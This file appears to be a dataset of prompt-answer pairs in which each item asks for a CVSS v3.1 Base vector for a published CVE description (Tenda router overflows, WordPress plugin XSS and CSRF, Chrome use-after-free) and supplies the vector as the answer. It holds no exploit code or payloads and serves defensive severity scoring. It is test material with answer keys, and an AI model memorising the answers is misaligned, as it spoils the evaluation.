Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Tenda i6 1.0.0.9(3857) and classified as critical. This issue affects the function formwrlSSIDset of the file /goform/wifiSSIDset of the component httpd. The manipulation of the argument index leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252257 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Request Forgery vulnerability in flusity-CMS v.2.33 allows a remote attacker to execute arbitrary code via the add_customblock.php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Posts to Page Kerry James allows Stored XSS.This issue affects Kerry James: from n/a through 1.7. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The EventON - WordPress Virtual Event Calendar Plugin plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 4.5.4 (Pro) & 2.2.8 (Free). This is due to missing or incorrect nonce validation on the save_virtual_event_settings function. This makes it possible for unauthenticated attackers to modify virtual event settings via a forged request granted they can trick a site administrator into performing an action such as clicking on a link. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The authentication mechanism can be bypassed by overflowing the value of the Cookie "authentication" field, provided there is an active user session. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Chromium Embedded Framework (CEF) is a simple framework for embedding Chromium-based browsers in other applications.`CefVideoConsumerOSR::OnFrameCaptured` does not check `pixel_format` properly, which leads to out-of-bounds read out of the sandbox. This vulnerability was patched in commit 1f55d2e. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Delhivery Delhivery Logistics Courier.This issue affects Delhivery Logistics Courier: from n/a through 1.0.107. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Limit Login Attempts Reloaded plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's shortcode(s) in all versions up to, and including, 2.25.26 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A cross-site scripting (XSS) vulnerability has been reported to affect Photo Station. If exploited, the vulnerability could allow authenticated users to inject malicious code via a network.  We have already fixed the vulnerability in the following version: Photo Station 6.4.2 ( 2023/12/15 ) and later 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Tenda AC10U 15.03.06.48/15.03.06.49. It has been rated as critical. This issue affects the function formSetSambaConf of the file /goform/setsambacfg. The manipulation of the argument usbName leads to os command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-257777 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been identified in Tecnomatix Plant Simulation V2201 (All versions), Tecnomatix Plant Simulation V2302 (All versions < V2302.0007). The affected applications contain a null pointer dereference vulnerability while parsing specially crafted SPP files. An attacker could leverage this vulnerability to crash the application causing denial of service condition. 	CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/currencylist.php, in the description parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function setIptvInfo. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Use after free in WebAudio in Google Chrome prior to 120.0.6099.199 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High) 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: flusity-CMS v2.33 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /core/tools/add_translation.php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Photo Gallery by 10Web – Mobile-Friendly Image Gallery plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 1.8.19 via the rename_item function. This makes it possible for authenticated attackers to rename arbitrary files on the server. This can lead to site takeovers if the wp-config.php file of a site can be renamed. By default this can be exploited by administrators only. In the premium version of the plugin, administrators can give gallery management permissions to lower level users, which might make this exploitable by users as low as contributors. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Contact Form, Survey & Popup Form Plugin for WordPress –  ARForms Form Builder plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘ arf_http_referrer_url’ parameter in all versions up to, and including, 1.5.8 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
